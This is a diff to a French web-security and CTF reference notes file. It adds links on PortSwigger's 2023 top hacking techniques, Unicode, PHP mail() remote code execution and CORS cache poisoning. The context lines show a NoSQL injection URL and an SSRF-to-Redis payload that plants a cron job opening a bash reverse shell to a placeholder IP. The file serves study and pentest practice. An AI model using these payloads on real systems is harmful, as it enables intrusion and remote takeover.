@@ -2,6 +2,7 @@
 
 - [OWASP Cheatsheet Series - Top 10][https://cheatsheetseries.owasp.org/IndexTopTen.html]
 - [Mozilla Client Docs](https://developer.mozilla.org/en-US/doc)
+- [Top 10 PortSwigger 2023](https://portswigger.net/polls/top-10-web-hacking-techniques-2023)
 
 ## Outils
 
@@ -80,6 +81,10 @@ Accéder
 - [Cheatsheet XSS (Ruulian)](https://0xhorizon.eu/fr/cheat-sheet/xss/)
 - https://www.nzeros.me/2023/08/07/securinetsminictf2k22/
 - https://repository.root-me.org/Exploitation%20-%20Web/EN%20-%20Spring%20boot%20-%20Reference%20guide.pdf
+
+## Encoding
+
+- https://www.joelonsoftware.com/2003/10/08/the-absolute-minimum-every-software-developer-absolutely-positively-must-know-about-unicode-and-character-sets-no-excuses/
 
 **Serveur**
 
@@ -164,6 +169,7 @@ https://www.vulnerable.com/search?id=23277%22}},{%22$lookup%22:{%22from%22:%22fl
   - `Phar` https://github.com/php/php-src/security/advisories/GHSA-jqcx-ccgc-xwhv
   - `Eval` https://www.defenxor.com/blog/writing-simple-php-non-alphanumeric-backdoor-to-evade-waf/
   - `Serialize` https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Insecure%20Deserialization/PHP.md
+  -  https://www.saotn.org/exploit-php-mail-get-remote-code-execution/
 
 #### CGI - bypass `disable_functions`
 
@@ -209,6 +215,7 @@ dict://127.0.0.1:6379/set -.- "\n\n\n* * * * * bash -i >\x26 /dev/tcp/<ip>/<port
 **Client**
 
 - https://developer.mozilla.org/en-US/docs/Web/Security/Same-origin_policy
+- https://nathandavison.com/blog/corsing-a-denial-of-service-via-cache-poisoning
 
 ### Obfu
 
